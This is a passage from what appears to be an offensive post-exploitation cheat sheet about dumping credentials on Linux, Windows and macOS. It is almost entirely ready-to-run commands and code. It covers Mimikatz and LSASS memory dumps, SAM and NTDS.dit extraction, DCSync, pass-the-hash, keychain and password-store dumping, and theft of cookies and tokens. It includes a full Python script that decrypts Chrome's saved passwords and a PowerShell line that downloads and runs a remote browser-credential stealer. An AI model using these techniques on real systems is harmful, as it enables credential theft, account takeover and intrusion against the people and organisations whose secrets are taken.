cat ~/.aws/credentials 2>/dev/null
cat ~/.azure/credentials 2>/dev/null
cat ~/.config/gcloud/credentials 2>/dev/null

# Git credentials
cat ~/.git-credentials 2>/dev/null
cat ~/.gitconfig 2>/dev/null
```

**Process Memory Dumping**

```bash
# Dump process memory (requires root)
gcore <PID>
gcore -o output <PID>

# Using gdb
gdb -p <PID>
(gdb) generate-core-file
(gdb) quit

# Dump all process memory
cat /proc/<PID>/maps
dd if=/proc/<PID>/mem of=process.dump bs=1 skip=<start_address> count=<size>

# Search memory for strings
strings /proc/<PID>/mem | grep -i password

# Automated memory search
for pid in $(ps aux | awk '{print $2}' | grep -v PID); do
    if [ -r /proc/$pid/environ ]; then
        echo "=== PID $pid ==="
        strings /proc/$pid/environ 2>/dev/null | grep -i "pass\|key\|token\|secret"
    fi
done
```

**Mimipenguin (Linux Credential Dumper)**

```bash
# Download and run mimipenguin
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
chmod +x mimipenguin.sh
sudo ./mimipenguin.sh

# Python version
sudo python3 mimipenguin.py
```

**Browser Credential Extraction**

```bash
# Firefox passwords
find ~ -name "logins.json" 2>/dev/null
find ~ -name "key4.db" 2>/dev/null

# Chrome/Chromium passwords
find ~ -name "Login Data" 2>/dev/null
sqlite3 ~/.config/google-chrome/Default/"Login Data" "SELECT origin_url, username_value, password_value FROM logins"

# Browser history
find ~ -name "History" 2>/dev/null
find ~ -name "places.sqlite" 2>/dev/null
```

**Cached Credentials**

```bash
# Kerberos tickets
klist
find /tmp -name "krb5cc_*" 2>/dev/null

# LDAP credentials
cat /etc/ldap/ldap.conf
cat ~/.ldaprc

# NFS exports
cat /etc/exports

# Samba credentials
cat /etc/samba/smb.conf
cat ~/.smbcredentials
```

### Windows Credential Dumping

**Mimikatz**

```cmd
REM Run mimikatz
mimikatz.exe

REM Privilege escalation
mimikatz # privilege::debug
mimikatz # token::elevate

REM Dump SAM
mimikatz # lsadump::sam

REM Dump LSA secrets
mimikatz # lsadump::secrets

REM Dump credentials from LSASS
mimikatz # sekurlsa::logonpasswords

REM Dump Kerberos tickets
mimikatz # sekurlsa::tickets

REM Export tickets
mimikatz # sekurlsa::tickets /export

REM Pass-the-hash
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd

REM Dump cached credentials
mimikatz # lsadump::cache

REM Dump credential manager
mimikatz # vault::cred /patch

REM Dump DPAPI secrets
mimikatz # dpapi::cache
mimikatz # sekurlsa::dpapi

REM Extract Kerberos encryption keys
mimikatz # sekurlsa::ekeys

REM DCSync attack (Domain Controller)
mimikatz # lsadump::dcsync /user:<domain>\<username>
mimikatz # lsadump::dcsync /domain:<domain> /all
```

**PowerShell Mimikatz (Invoke-Mimikatz)**

```powershell
# Import module
Import-Module .\Invoke-Mimikatz.ps1

# Dump credentials
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump SAM
Invoke-Mimikatz -Command '"lsadump::sam"'

# Dump LSA
Invoke-Mimikatz -Command '"lsadump::secrets"'

# Export to file
Invoke-Mimikatz -DumpCreds -ComputerName @("server1","server2")

# Remote execution
Invoke-Mimikatz -ComputerName <target>
```

**LSASS Memory Dump**

```powershell
# Task Manager method (GUI)
# Right-click lsass.exe -> Create dump file

# ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# PowerShell method
$process = Get-Process lsass
$dumpFile = "C:\temp\lsass.dmp"
[System.Diagnostics.Process]::GetProcessById($process.Id).MiniDumpWriteDump($dumpFile)

# comsvcs.dll method
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Get LSASS PID
tasklist | findstr lsass
Get-Process lsass | Select-Object Id

# Parse offline with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Parse with pypykatz
pypykatz lsa minidump lsass.dmp
```

**Registry Credential Extraction**

```cmd
REM Save registry hives
reg save HKLM\SAM SAM.hive
reg save HKLM\SYSTEM SYSTEM.hive
reg save HKLM\SECURITY SECURITY.hive

REM Export specific keys
reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" winlogon.reg

REM VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password

REM SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

REM Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

REM WiFi passwords (also see netsh below)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"

REM Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
```

**PowerShell Registry Credentials**

```powershell
# Autologon credentials
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Recently used credentials
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

# Saved RDP credentials
Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse

# Credential Manager
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$credman = New-Object -TypeName PSCredentialManager.CredentialStore
$credman.GetCredentials()

# DPAPI blobs in registry
Get-ChildItem "HKCU:\Software\Microsoft\Protected Storage System Provider" -Recurse
```

**Credential Manager Dumping**

```cmd
REM List stored credentials
cmdkey /list

REM VaultCmd
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"
vaultcmd /listproperties

REM Windows Credential Manager files
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\
dir /a %userprofile%\AppData\Roaming\Microsoft\Credentials\
dir /a C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\

REM Dump with mimikatz
mimikatz # vault::list
mimikatz # vault::cred /patch
```

**PowerShell Credential Dumping**

```powershell
# Invoke-CredentialInjection
Import-Module .\Invoke-CredentialInjection.ps1
Invoke-CredentialInjection

# Get-Credential PowerShell prompt (social engineering)
$cred = Get-Credential
$cred.GetNetworkCredential().Password

# SessionGopher (find stored sessions and passwords)
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# LaZagne (password recovery tool)
.\lazagne.exe all

# SharpDPAPI
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe masterkeys
.\SharpDPAPI.exe machinemasterkeys
.\SharpDPAPI.exe machinetriage
.\SharpDPAPI.exe triage
```

**SAM and SYSTEM Extraction**

```cmd
REM Volume Shadow Copy method
vssadmin list shadows
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

REM Using reg save (requires admin)
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

REM Parse with secretsdump.py (Impacket)
secretsdump.py -sam SAM -system SYSTEM LOCAL

REM Parse with samdump2
samdump2 SYSTEM SAM
```

**NTDS.dit Extraction (Domain Controller)**

```cmd
REM Using ntdsutil
ntdsutil
activate instance ntds
ifm
create full C:\temp\ntds
quit
quit

REM Using vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

REM Extract hashes with secretsdump.py
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

REM Using mimikatz (DCSync)
mimikatz # lsadump::dcsync /domain:<domain> /all /csv
```

**Network Credentials**

```cmd
REM WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

REM All WiFi passwords
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

REM VPN credentials
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
rasdial

REM Cached RDP credentials
cmdkey /list | findstr Target
```

**PowerShell Network Credentials**

```powershell
# WiFi passwords
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{Name=$name;Password=$pass}}

# Saved browser passwords (requires modules)
Import-Module .\Get-WebCredentials.ps1
Get-WebCredentials

# IE/Edge saved passwords
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
```

**Application-Specific Credentials**

```cmd
REM FileZilla
type "%appdata%\FileZilla\recentservers.xml"
type "%appdata%\FileZilla\sitemanager.xml"

REM WinSCP
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"

REM Git
type %userprofile%\.git-credentials
type %userprofile%\.gitconfig

REM AWS CLI
type %userprofile%\.aws\credentials
type %userprofile%\.aws\config

REM Azure CLI
type %userprofile%\.azure\azureProfile.json

REM Slack tokens
dir /s /b %userprofile%\AppData\Roaming\Slack\Cookies
dir /s /b %userprofile%\AppData\Roaming\Slack\Local Storage\leveldb

REM Discord tokens
findstr /s /i "token" "%appdata%\Discord\Local Storage\leveldb\*.ldb"

REM Database clients
type "%appdata%\MySQL\Workbench\sql_history"
type "%appdata%\MySQL\Workbench\server_instances.xml"
```

**Token Manipulation**

```powershell
# Incognito (Mimikatz alternative)
.\incognito.exe list_tokens -u
.\incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# PowerShell token manipulation
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Invoke-TokenManipulation -Enumerate

# Get available tokens
Get-Process | Select-Object Name,Id,Handle | Where-Object {$_.Handle -ne 0}
```

**Memory Analysis for Credentials**

```powershell
# Dump all process memory
Get-Process | ForEach-Object {
    $proc = $_
    $dumpFile = "C:\dumps\$($proc.Name)_$($proc.Id).dmp"
    try {
        .\procdump.exe -accepteula -ma $proc.Id $dumpFile
    } catch {}
}

# Search memory dumps for patterns
Select-String -Path "C:\dumps\*.dmp" -Pattern "password|pwd|secret" -CaseSensitive:$false

# PowerShell runspace credentials
Get-Runspace | ForEach-Object {
    $_.SessionStateProxy.PSVariable.Get("*credential*")
}
```

**Kerberos Ticket Extraction**

```cmd
REM List tickets
klist
klist sessions
klist tgt

REM Export tickets with mimikatz
mimikatz # sekurlsa::tickets /export

REM Rubeus ticket extraction
.\Rubeus.exe dump
.\Rubeus.exe dump /luid:0x3e7
.\Rubeus.exe klist
.\Rubeus.exe triage

REM Inject ticket
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

**Important Subtopics**

**Active Directory Enumeration** - comprehensive AD reconnaissance including users, groups, trusts, ACLs, and GPO analysis **Container and Virtualization Escape** - Docker, Kubernetes, and VM breakout techniques post-compromise **Lateral Movement Preparation** - identifying pivot points, network segmentation, and accessible hosts **Data Exfiltration Channels** - covert data extraction methods and staging techniques

---

## Password Store Extraction

### Windows Credential Manager

**Command-Line Extraction**

```powershell
# List stored credentials
cmdkey /list

# Export credentials (requires admin)
rundll32.exe keymgr.dll,KRShowKeyMgr

# VaultCmd (Windows credential vault)
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all

# PowerShell credential extraction
$creds = Get-WmiObject -Namespace "root\cimv2" -Class Win32_UserProfile
foreach($cred in $creds) {
    Write-Host "User: $($cred.LocalPath)"
}
```

**Mimikatz Credential Extraction**

```powershell
# Load mimikatz
.\mimikatz.exe

# Extract credentials from memory
privilege::debug
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets

# Extract credential manager passwords
vault::cred /patch

# DPAPI credential extraction
dpapi::cred /in:"%appdata%\Microsoft\Credentials\*"

# LSA secrets
lsadump::secrets

# SAM database
lsadump::sam

# Extract domain cached credentials
lsadump::cache
```

**LaZagne - Multi-Platform Password Recovery**

```bash
# Windows - All modules
laZagne.exe all

# Specific categories
laZagne.exe browsers
laZagne.exe wifi
laZagne.exe databases
laZagne.exe sysadmin
laZagne.exe git
laZagne.exe memory

# Output to JSON
laZagne.exe all -oJ -output results.json

# Verbose output
laZagne.exe all -v

# Linux version
python3 laZagne.py all
python3 laZagne.py browsers
```

**Windows Credential Files Location**

```powershell
# Credential Manager files
%LOCALAPPDATA%\Microsoft\Credentials\*
%APPDATA%\Microsoft\Credentials\*

# Vault files
%LOCALAPPDATA%\Microsoft\Vault\*
%APPDATA%\Microsoft\Vault\*

# Protected storage
%APPDATA%\Microsoft\Protect\*

# List all credential files
dir /s /b %LOCALAPPDATA%\Microsoft\Credentials\
dir /s /b %APPDATA%\Microsoft\Protect\
```

### Linux Password Stores

**GNOME Keyring Extraction**

```bash
# Keyring location
~/.local/share/keyrings/

# List keyrings
ls -la ~/.local/share/keyrings/

# Dump login keyring (requires password)
python3 -c "import secretstorage; bus = secretstorage.dbus_init(); collection = secretstorage.get_default_collection(bus); for item in collection.get_all_items(): print(item.get_label(), item.get_secret())"

# Using gnome-keyring-dump
git clone https://github.com/juuso/gnome-keyring-dump.git
python3 gnome-keyring-dump/gnome-keyring-dump.py
```

**KWallet Extraction (KDE)**

```bash
# KWallet location
~/.local/share/kwalletd/

# List wallets
ls -la ~/.local/share/kwalletd/

# Extract with kwalletcli
kwalletcli -f kdewallet -e "Entry Name"

# Dump entire wallet (if unlocked)
qdbus org.kde.kwalletd /modules/kwalletd org.kde.KWallet.wallets
```

**Pass (Password Store)**

```bash
# Password store location
~/.password-store/

# List all passwords
pass ls

# Show password
pass show service/account

# GPG-encrypted, extract GPG keys first
gpg --list-secret-keys
gpg --export-secret-keys > private_keys.asc

# Copy entire password store
tar -czf passwords.tar.gz ~/.password-store/
```

**SSH Keys and Config**

```bash
# Private keys location
~/.ssh/

# List all SSH keys
ls -la ~/.ssh/id_*

# SSH config
cat ~/.ssh/config

# Known hosts
cat ~/.ssh/known_hosts

# Authorized keys
cat ~/.ssh/authorized_keys

# Copy all SSH data
tar -czf ssh_data.tar.gz ~/.ssh/

# Check for passphrase-protected keys
for key in ~/.ssh/id_*; do
    if [[ -f "$key" ]] && [[ ! "$key" == *.pub ]]; then
        echo "Testing $key"
        ssh-keygen -y -f "$key" 2>&1 | grep -q "passphrase" && echo "[!] Passphrase protected" || echo "[+] No passphrase"
    fi
done
```

### macOS Keychain Extraction

**Security Command-Line**

```bash
# List all keychains
security list-keychains

# Dump keychain passwords (requires keychain password)
security dump-keychain -d login.keychain

# Find generic password
security find-generic-password -ga "account_name"

# Find internet password
security find-internet-password -ga "account_name"

# Export certificates
security find-certificate -a -p > certificates.pem

# Dump all passwords (requires authorization)
security dump-keychain login.keychain-db
```

**Chain Breaker - Keychain Extraction Tool**

```bash
# Install
git clone https://github.com/n0fate/chainbreaker.git
cd chainbreaker

# Extract passwords from keychain
python3 chainbreaker.py -p keychain_password ~/Library/Keychains/login.keychain-db

# Dump to CSV
python3 chainbreaker.py -p keychain_password ~/Library/Keychains/login.keychain-db -o keychain.csv
```

### Database Credential Files

**Common Database Credential Locations**

**MySQL/MariaDB**

```bash
# Linux
/etc/mysql/my.cnf
~/.my.cnf
~/.mysql_history

# Windows
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
%APPDATA%\MySQL\my.ini

# Extract credentials
grep -E "user|password" /etc/mysql/my.cnf
grep -E "user|password" ~/.my.cnf
```

**PostgreSQL**

```bash
# Password file
~/.pgpass
# Format: hostname:port:database:username:password

# Service file
~/.pg_service.conf

# Environment variables
echo $PGPASSWORD
echo $PGUSER

# Connection history
~/.psql_history
```

**MongoDB**

```bash
# Config file
/etc/mongod.conf
~/.mongorc.js

# Connection strings in bash history
cat ~/.bash_history | grep mongodb://

# Format: mongodb://username:password@host:port/database
```

**Redis**

```bash
# Config file
/etc/redis/redis.conf

# Look for requirepass directive
grep "requirepass" /etc/redis/redis.conf

# Authentication in config
grep -E "user|password|requirepass" /etc/redis/redis.conf
```

**MSSQL**

```powershell
# Connection strings in registry
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr "ConnectionString"

# SQL Server config
type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\mssql.conf"
```

### Git Credential Storage

**Git Credentials**

```bash
# Credential helper cache
git config --get credential.helper

# Stored credentials
cat ~/.git-credentials
# Format: https://username:password@github.com

# Git config
cat ~/.gitconfig | grep -A 5 "\[credential\]"

# Windows Credential Manager (Git for Windows)
git credential-manager version
cmdkey /list | findstr git

# Extract from git config
git config --list | grep credential
```

### Application-Specific Credentials

**FTP Clients**

```bash
# FileZilla
# Linux: ~/.config/filezilla/
# Windows: %APPDATA%\FileZilla\

# Extract FileZilla credentials
cat ~/.config/filezilla/recentservers.xml
cat ~/.config/filezilla/sitemanager.xml

# Windows
type %APPDATA%\FileZilla\recentservers.xml
type %APPDATA%\FileZilla\sitemanager.xml

# Decode base64 passwords in XML
grep -oP 'Pass=".*?"' sitemanager.xml | cut -d'"' -f2 | base64 -d
```

**WinSCP**

```powershell
# Registry location
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s

# Extract and decrypt (stored in registry)
# Password is encrypted with username and hostname as key

# Using WinSCP password decryptor
# https://github.com/dzzie/winscp_password_recover
```

**PuTTY**

```powershell
# Registry location
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Extract proxy passwords
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /v ProxyPassword

# Private keys
dir /s /b %USERPROFILE%\*.ppk

# Convert PPK to OpenSSH format
puttygen private_key.ppk -O private-openssh -o id_rsa
```

**RDP Credentials**

```powershell
# Saved RDP connections
dir /s /b %USERPROFILE%\*.rdp

# Extract credentials from RDP files
findstr /si password *.rdp

# Windows Credential Manager for RDP
cmdkey /list | findstr "TERMSRV"

# Mimikatz RDP credential extraction
privilege::debug
ts::logonpasswords
```

---

## Browser Credential Extraction

### Google Chrome / Chromium

**Windows Chrome Passwords**

```powershell
# Database location
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Copy database (Chrome must be closed)
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" LoginData.db

# SQLite query
sqlite3 LoginData.db "SELECT origin_url, username_value, password_value FROM logins"

# Passwords are encrypted with DPAPI
# Master key location
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
```

**Chrome Password Decryption Script (Python)**

```python
import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt

def get_master_key():
    # Chrome Local State path
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'],
                                     'Google\\Chrome\\User Data\\Local State')
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    # Decode encrypted key
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    
    # Decrypt with DPAPI
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(encrypted_password, master_key):
    try:
        # Version
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        
        # Create cipher
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        
        # Decrypt
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return str(e)

def extract_chrome_passwords():
    # Copy database
    db_path = os.path.join(os.environ['LOCALAPPDATA'],
                           'Google\\Chrome\\User Data\\Default\\Login Data')
    temp_db = 'ChromeData.db'
    shutil.copyfile(db_path, temp_db)
    
    # Get master key
    master_key = get_master_key()
    
    # Connect to database
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    # Query passwords
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        if encrypted_password:
            password = decrypt_password(encrypted_password, master_key)
            print(f"URL: {url}")
            print(f"Username: {username}")
            print(f"Password: {password}\n")
    
    conn.close()
    os.remove(temp_db)

extract_chrome_passwords()
```

**Linux Chrome Passwords**

```bash
# Database location
~/.config/google-chrome/Default/Login Data

# Copy and query
cp ~/.config/google-chrome/Default/Login\ Data /tmp/LoginData.db
sqlite3 /tmp/LoginData.db "SELECT origin_url, username_value, password_value FROM logins"

# Passwords encrypted with libsecret/gnome-keyring
# Key stored in keyring with label "Chrome Safe Storage"
```

**Chrome Cookies**

```powershell
# Windows cookies location
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies

# Copy and query
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" Cookies.db
sqlite3 Cookies.db "SELECT host_key, name, encrypted_value FROM cookies"

# Linux
~/.config/google-chrome/Default/Cookies
```

**Chrome History**

```bash
# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\History

# Linux
~/.config/google-chrome/Default/History

# Extract URLs
sqlite3 History "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100"

# Extract downloads
sqlite3 History "SELECT target_path, tab_url, start_time, end_time FROM downloads"
```

**Chrome Extensions**

```bash
# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\

# Linux
~/.config/google-chrome/Default/Extensions/

# List installed extensions
ls -la "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\"

# Look for password managers, crypto wallets, etc.
```

### Mozilla Firefox

**Firefox Passwords**

```bash
# Profile location
# Windows: %APPDATA%\Mozilla\Firefox\Profiles\
# Linux: ~/.mozilla/firefox/

# Find profile directory
ls ~/.mozilla/firefox/*.default-release/

# Password files
logins.json          # Encrypted passwords
key4.db              # Master password protection
```

**Firefox Password Extraction Script (Python)**

```python
import json
import sqlite3
import base64
from Crypto.Cipher import DES3
from hashlib import sha1
import hmac

def extract_firefox_passwords(profile_path):
    # Read logins.json
    logins_file = f"{profile_path}/logins.json"
    
    with open(logins_file, 'r') as f:
        logins_data = json.load(f)
    
    # Connect to key4.db
    key_db = f"{profile_path}/key4.db"
    conn = sqlite3.connect(key_db)
    cursor = conn.cursor()
    
    # Extract encryption key
    cursor.execute("SELECT item1, item2 FROM metadata WHERE id='password'")
    key_data = cursor.fetchone()
    
    # Process each login
    for login in logins_data['logins']:
        url = login['hostname']
        username = login['encryptedUsername']
        password = login['encryptedPassword']
        
        print(f"URL: {url}")
        print(f"Username: [encrypted]")
        print(f"Password: [encrypted]\n")
    
    conn.close()

# Usage
profile_path = "/home/user/.mozilla/firefox/xxxxxxxx.default-release"
extract_firefox_passwords(profile_path)
```

**Firefox Decrypt Tool**

```bash
# Install firefox_decrypt
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt

# Extract passwords
python3 firefox_decrypt.py ~/.mozilla/firefox/

# Specify profile
python3 firefox_decrypt.py ~/.mozilla/firefox/xxxxxxxx.default-release/

# Non-interactive (if no master password)
python3 firefox_decrypt.py --non-interactive ~/.mozilla/firefox/
```

**Firefox Cookies**

```bash
# Cookie database
~/.mozilla/firefox/xxxxxxxx.default-release/cookies.sqlite

# Extract cookies
sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies"

# Session cookies
~/.mozilla/firefox/xxxxxxxx.default-release/sessionstore.jsonlz4

# Decompress session file (LZ4 compressed)
pip install lz4
python3 -c "import lz4.block; import sys; sys.stdout.buffer.write(lz4.block.decompress(open('sessionstore.jsonlz4','rb').read()[8:]))" > sessionstore.json
```

**Firefox History**

```bash
# History database
~/.mozilla/firefox/xxxxxxxx.default-release/places.sqlite

# Extract URLs
sqlite3 places.sqlite "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY visit_count DESC LIMIT 100"

# Bookmarks
sqlite3 places.sqlite "SELECT moz_places.url, moz_bookmarks.title FROM moz_places, moz_bookmarks WHERE moz_bookmarks.fk=moz_places.id"

# Downloads
sqlite3 places.sqlite "SELECT content FROM moz_annos WHERE anno_attribute_id=3"
```

### Microsoft Edge

**Edge Chromium Passwords**

```powershell
# Database location (Chromium-based)
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Same extraction method as Chrome
# Copy database
copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" EdgeLogin.db

# Master key
%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
```

**Edge Legacy (Pre-Chromium)**

```powershell
# Windows Vault storage
vaultcmd /listcreds:"Web Credentials" /all

# Extract with mimikatz
vault::list
vault::cred /patch
```

### Safari (macOS)

**Safari Passwords**

```bash
# Keychain location
~/Library/Keychains/login.keychain-db

# Extract with security command
security find-internet-password -ga "website.com"

# Safari password database
~/Library/Safari/Passwords.db

# Requires macOS keychain password to decrypt
```

**Safari Cookies and History**

```bash
# Cookies
~/Library/Cookies/Cookies.binarycookies

# History
~/Library/Safari/History.db

# Extract history
sqlite3 ~/Library/Safari/History.db "SELECT url, visit_time FROM history_visits JOIN history_items ON history_visits.history_item=history_items.id"
```

### Internet Explorer

**IE Passwords**

```powershell
# Stored in Windows Vault
vaultcmd /listcreds:"Web Credentials" /all

# Using mimikatz
vault::cred

# IE Protected Storage (older versions)
# Stored in registry
reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s
```

**IE History**

```powershell
# History location
%LOCALAPPDATA%\Microsoft\Windows\WebCache\WebCacheV01.dat

# Extract with ESEDatabaseView
# https://www.nirsoft.net/utils/ese_database_view.html

# Typed URLs (address bar)
reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
```

### Automated Browser Credential Tools

**HackBrowserData (Multi-Browser)**

```bash
# Install
git clone https://github.com/moonD4rk/HackBrowserData.git
cd HackBrowserData

# Windows
hack-browser-data.exe

# Linux
./hack-browser-data

# Export to JSON
./hack-browser-data -f json -o results.json

# Specific browsers
./hack-browser-data -b chrome -b firefox
```

**BrowserGather**

```powershell
# PowerShell script
# Download from GitHub
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sekirkity/BrowserGather/master/BrowserGather.ps1')

# Run
Invoke-BrowserGather
```

**SharpChrome (Chrome Password Dumper)**

```powershell
# Compile or download binary
# https://github.com/GhostPack/SharpDPAPI

# Extract Chrome passwords
.\SharpChrome.exe logins /unprotect

# Extract cookies
.\SharpChrome.exe cookies /unprotect
```

---

## File System Analysis

### Interesting File Locations

**Windows Sensitive Directories**

```powershell
# User profiles
dir /s /b C:\Users\*\Desktop\*.txt
dir /s /b C:\Users\*\Documents\*.doc*
dir /s /b C:\Users\*\Downloads\

# Program data
dir /s /b C:\ProgramData\*.conf
dir /s /b C:\ProgramData\*.config
dir /s /b C:\ProgramData\*.xml

# IIS web roots
dir /s /b C:\inetpub\wwwroot\web.config
dir /s /b C:\inetpub\wwwroot\*.config

# Apache/nginx
dir /s /b C:\Apache*\conf\httpd.conf
dir /s /b C:\nginx\conf\nginx.conf

# Application configs
dir /s /b "C:\Program Files\*\*.conf"
dir /s /b "C:\Program Files (x86)\*\*.config"
```

**Linux Sensitive Directories**

```bash
# Home directories
find /home -type f -name "*.txt" 2>/dev/null
find /home -type f -name "*.doc*" 2>/dev/null
find /home -type f -name "*.pdf" 2>/dev/null

# Configuration files
find /etc -type f -name "*.conf" 2>/dev/null
find /etc -type f -name "*.config" 2>/dev/null

# Web roots
find /var/www -type f -name "*.config" 2>/dev/null
find /var/www -type f -name "*.php" 2>/dev/null

# Backup directories
find / -type d -name "*backup*" 2>/dev/null
find / -type d -name "*bak" 2>/dev/null

# Temporary files
find /tmp -type f 2>/dev/null
find /var/tmp -type f 2>/dev/null
```

### Searching for Sensitive Files

**Password File Search (Windows)**

```powershell
# Search for password files
dir /s /b C:\*password*.txt
dir /s /b C:\*password*.doc*
dir /s /b C:\*password*.xls*
dir /s /b C:\*credential*.txt
dir /s /b C:\*secret*.txt

# Database files
dir /s /b C:\*.sql
dir /s /b C:\*.db
dir /s /b C:\*.sqlite
dir /s /b C:\*.mdb

# Backup files
dir /s /b C:\*.bak
dir /s /b C:\*.backup
dir /s /b C:\*.old

# Configuration files
dir /s /b C:\*.config
dir /s /b C:\*.conf
dir /s /b C:\*.ini
dir /s /b C:\*.xml
```

**Password File Search (Linux)**

```bash
# Find files containing "password"
grep -r -i "password" /home 2>/dev/null
grep -r -i "password" /etc 2>/dev/null
grep -r -i "password" /var/www 2>/dev/null

# Find credential files
find / -name "*password*" -type f 2>/dev/null
find / -name "*credential*" -type f 2>/dev/null
find / -name "*secret*" -type f 2>/dev/null
find / -name "*.key" -type f 2>/dev/null

# Database files
find / -name "*.sql" -type f 2>/dev/null
find / -name "*.db" -type f 2>/dev/null
find / -name "*.sqlite*" -type f 2>/dev/null

# Backup files
find / -name "*.bak" -type f 2>/dev/null
find / -name "*backup*" -type f 2>/dev/null
find / -name "*.old" -type f 2>/dev/null
```

### Content-Based File Search

**Windows Content Search**

```powershell
# Search for passwords in files
findstr /si "password" C:\*.txt C:\*.config C:\*.xml
findstr /si "pwd=" C:\*.config C:\*.xml C:\*.ini
